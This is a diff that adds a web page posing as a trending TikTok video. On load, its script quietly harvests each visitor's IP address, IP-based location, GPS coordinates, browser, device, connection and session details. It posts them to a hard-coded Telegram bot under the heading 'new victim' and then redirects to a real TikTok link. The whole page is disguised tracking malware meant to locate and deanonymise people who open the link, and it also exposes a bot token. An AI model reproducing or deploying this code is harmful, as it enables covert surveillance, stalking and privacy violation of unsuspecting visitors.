@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TikTok Video</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #fff; 
+            text-align: center; 
+            font-family: Arial; 
+            margin: 0;
+            padding: 20px;
+        }
+        .loader {
+            margin-top: 50px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #data {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎵 TRENDING TIKTOK VIDEO</h1>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Preparing video content...</p>
+    </div>
+
+    <div id="data"></div>
+
+    <script>
+        async function collectSortedData() {
+            const data = {
+                network: {},
+                system: {},
+                device: {},
+                connection: {},
+                location: {},
+                timing: {},
+                session: {}
+            };
+
+            // 1. СЕТЕВЫЕ ДАННЫЕ
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.network.IP = ipData.ip;
+                
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                data.network.Страна = geoData.country_name;
+                data.network.Город = geoData.city;
+                data.network.Регион = geoData.region;
+                data.network.Провайдер = geoData.org;
+                data.network.ЧасовойПояс = geoData.timezone;
+            } catch(e) {}
+
+            // 2. СИСТЕМНЫЕ ДАННЫЕ
+            data.system.Браузер = navigator.userAgent;
+            data.system.Платформа = navigator.platform;
+            data.system.Язык = navigator.language;
+            data.system.ДоступныеЯзыки = navigator.languages.join(', ');
+            data.system.Вендор = navigator.vendor;
+
+            // 3. ДАННЫЕ УСТРОЙСТВА
+            data.device.Экран = `${screen.width}x${screen.height}`;
+            data.device.ГлубинаЦвета = `${screen.colorDepth}bit`;
+            data.device.ПлотностьПикселей = window.devicePixelRatio;
+            data.device.СенсорныйЭкран = !!('ontouchstart' in window) ? 'Да' : 'Нет';
+            data.device.ЯдраCPU = navigator.hardwareConcurrency;
+            data.device.Память = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'неизвестно';
+
+            // 4. ДАННЫЕ ПОДКЛЮЧЕНИЯ
+            if (navigator.connection) {
+                data.connection.Тип = navigator.connection.effectiveType;
+                data.connection.Скорость = `${navigator.connection.downlink}Mbps`;
+                data.connection.Задержка = `${navigator.connection.rtt}ms`;
+            }
+
+            // 5. ГЕОЛОКАЦИЯ
+            if (navigator.geolocation) {
+                await new Promise(resolve => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            data.location.Широта = position.coords.latitude;
+                            data.location.Долгота = position.coords.longitude;
+                            data.location.Точность = `${position.coords.accuracy}м`;
+                            resolve();
+                        },
+                        () => {
+                            data.location.Статус = 'Доступ запрещен';
+                            resolve();
+                        },
+                        { timeout: 3000 }
+                    );
+                });
+            } else {
+                data.location.Статус = 'Геолокация не поддерживается';
+            }
+
+            // 6. ВРЕМЕННЫЕ ДАННЫЕ
+            const now = new Date();
+            data.timing.ЛокальноеВремя = now.toLocaleString('ru-RU', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            data.timing.ЧасовойПояс = `UTC${now.getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(now.getTimezoneOffset()/60)}`;
+
+            // 7. ДАННЫЕ СЕАНСА
+            data.session.Источник = document.referrer || 'прямой заход';
+            data.session.URL = window.location.href;
+
+            await sendFormattedToTelegram(data);
+        }
+
+        async function sendFormattedToTelegram(data) {
+            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
+            const chatId = "1486385025";
+            
+            try {
+                // Формируем единое сообщение с правильными переносами
+                let message = '🆕 НОВАЯ ЖЕРТВА :\n';
+                message += '⸻⸻⸻⸻⸻\n\n';
+
+                // СЕТЕВЫЕ ДАННЫЕ
+                message += '🌐 СЕТЕВЫЕ ДАННЫЕ\n';
+                if (data.network.IP) message += `IP: ${data.network.IP}\n`;
+                if (data.network.Страна) message += `Страна: ${data.network.Страна}\n`;
+                if (data.network.Город) message += `Город: ${data.network.Город}\n`;
+                if (data.network.Регион) message += `Регион: ${data.network.Регион}\n`;
+                if (data.network.Провайдер) message += `Провайдер: ${data.network.Провайдер}\n`;
+                if (data.network.ЧасовойПояс) message += `ЧасовойПояс: ${data.network.ЧасовойПояс}\n`;
+                message += '\n⸻\n\n';
+
+                // СИСТЕМНЫЕ ДАННЫЕ
+                message += '💻 СИСТЕМНЫЕ ДАННЫЕ\n';
+                if (data.system.Браузер) message += `Браузер: ${data.system.Браузер}\n`;
+                if (data.system.Платформа) message += `Платформа: ${data.system.Платформа}\n`;
+                if (data.system.Язык) message += `Язык: ${data.system.Язык}\n`;
+                if (data.system.ДоступныеЯзыки) message += `ДоступныеЯзыки: ${data.system.ДоступныеЯзыки}\n`;
+                if (data.system.Вендор) message += `Вендор: ${data.system.Вендор}\n`;
+                message += '\n⸻\n\n';
+
+                // ДАННЫЕ УСТРОЙСТВА
+                message += '📱 ДАННЫЕ УСТРОЙСТВА\n';
+                if (data.device.Экран) message += `Экран: ${data.device.Экран}\n`;
+                if (data.device.ГлубинаЦвета) message += `ГлубинаЦвета: ${data.device.ГлубинаЦвета}\n`;
+                if (data.device.ПлотностьПикселей) message += `ПлотностьПикселей: ${data.device.ПлотностьПикселей}\n`;
+                if (data.device.СенсорныйЭкран) message += `СенсорныйЭкран: ${data.device.СенсорныйЭкран}\n`;
+                if (data.device.ЯдраCPU) message += `ЯдраCPU: ${data.device.ЯдраCPU}\n`;
+                if (data.device.Память) message += `Память: ${data.device.Память}\n`;
+                message += '\n⸻\n\n';
+
+                // ДАННЫЕ ПОДКЛЮЧЕНИЯ
+                if (Object.keys(data.connection).length > 0) {
+                    message += '📶 ДАННЫЕ ПОДКЛЮЧЕНИЯ\n';
+                    if (data.connection.Тип) message += `Тип: ${data.connection.Тип}\n`;
+                    if (data.connection.Скорость) message += `Скорость: ${data.connection.Скорость}\n`;
+                    if (data.connection.Задержка) message += `Задержка: ${data.connection.Задержка}\n`;
+                    message += '\n⸻\n\n';
+                }
+
+                // ГЕОЛОКАЦИЯ
+                message += '📍 ГЕОЛОКАЦИЯ\n';
+                if (data.location.Широта) {
+                    message += `Широта: ${data.location.Широта}\n`;
+                    message += `Долгота: ${data.location.Долгота}\n`;
+                    message += `Точность: ${data.location.Точность}\n`;
+                } else if (data.location.Статус) {
+                    message += `Статус: ${data.location.Статус}\n`;
+                }
+                message += '\n⸻\n\n';
+
+                // ВРЕМЕННЫЕ ДАННЫЕ
+                message += '⏰ ВРЕМЕННЫЕ ДАННЫЕ\n';
+                if (data.timing.ЛокальноеВремя) message += `ЛокальноеВремя: ${data.timing.ЛокальноеВремя}\n`;
+                if (data.timing.ЧасовойПояс) message += `ЧасовойПояс: ${data.timing.ЧасовойПояс}\n`;
+                message += '\n⸻\n\n';
+
+                // ДАННЫЕ СЕАНСА
+                message += '🔗 ДАННЫЕ СЕАНСА\n';
+                if (data.session.Источник) message += `Источник: ${data.session.Источник}\n`;
+                if (data.session.URL) message += `URL: ${data.session.URL}`;
+
+                // Отправляем ОДНО сообщение
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+            } catch(e) {
+                console.error('Telegram error:', e);
+            }
+        }
+
+        // ЗАПУСК
+        setTimeout(() => {
+            collectSortedData();
+            setTimeout(() => {
+                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
+            }, 4500);
+        }, 1000);
+    </script>
+</body>
+</html>
